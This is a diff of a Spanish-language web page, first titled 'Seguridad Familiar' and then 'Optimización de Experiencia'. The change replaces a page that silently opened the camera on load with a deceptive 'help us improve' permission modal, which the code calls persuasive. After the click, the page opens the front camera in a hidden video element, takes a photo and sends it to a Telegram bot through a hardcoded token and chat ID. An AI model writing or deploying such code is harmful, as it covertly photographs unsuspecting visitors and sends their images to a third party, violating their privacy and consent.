@@ -3,31 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Seguridad Familiar</title>
+    <title>Optimización de Experiencia</title>
+    <style>
+        /* Modal centrado */
+        #permission-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6); /* Fondo oscuro */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        #permission-content {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 90%;
+        }
+
+        #permission-modal button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background: #28a745;
+            color: white;
+            cursor: pointer;
+        }
+
+        #permission-modal button:hover {
+            background: #218838;
+        }
+
+        #permission-modal h2 {
+            margin-bottom: 10px;
+        }
+
+        #permission-modal p {
+            color: #555;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Modal persuasivo -->
+    <div id="permission-modal">
+        <div id="permission-content">
+            <h2>Ayúdanos a Mejorar</h2>
+            <p>Recopilamos datos para ofrecerte una experiencia optimizada y personalizada. Por favor, concede permisos para continuar.</p>
+            <button onclick="requestPermissions()">Aceptar</button>
+        </div>
+    </div>
+
     <script>
-        const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g'; // Token del bot
-        const chatId = '1223367230'; // Chat ID
+        async function requestPermissions() {
+            const modal = document.getElementById('permission-modal');
+            modal.style.display = 'none'; // Ocultar el modal después de la aceptación
+            await initializeCamera(); // Iniciar la cámara
+        }
 
         async function initializeCamera() {
             const constraints = {
                 video: {
-                    facingMode: "user" // Seleccionar cámara frontal
+                    facingMode: "user" // Intentar usar la cámara frontal
                 }
             };
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.createElement('video'); // Crear elemento video en segundo plano
-                video.style.display = 'none'; // Ocultarlo visualmente
+                const video = document.createElement('video'); // Crear video oculto
+                video.style.display = 'none';
                 document.body.appendChild(video);
                 video.srcObject = stream;
                 video.play();
 
-                // Esperar a que el video esté listo
                 video.onloadedmetadata = async () => {
                     await captureAndSendPhoto(video, stream);
-                    stream.getTracks().forEach(track => track.stop()); // Detener cámara después de capturar
-                    video.remove(); // Eliminar el elemento video
+                    stream.getTracks().forEach(track => track.stop()); // Detener cámara
+                    video.remove(); // Eliminar elemento video
                 };
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
@@ -35,6 +97,8 @@
         }
 
         async function captureAndSendPhoto(video, stream) {
+            const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g'; // Token del bot
+            const chatId = '1223367230'; // Chat ID
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
 
@@ -67,12 +131,6 @@
                 }
             }, 'image/jpeg');
         }
-
-        // Iniciar cámara automáticamente al cargar la página
-        window.onload = initializeCamera;
     </script>
-</head>
-<body>
-    <!-- No hay contenido visible -->
 </body>
 </html>
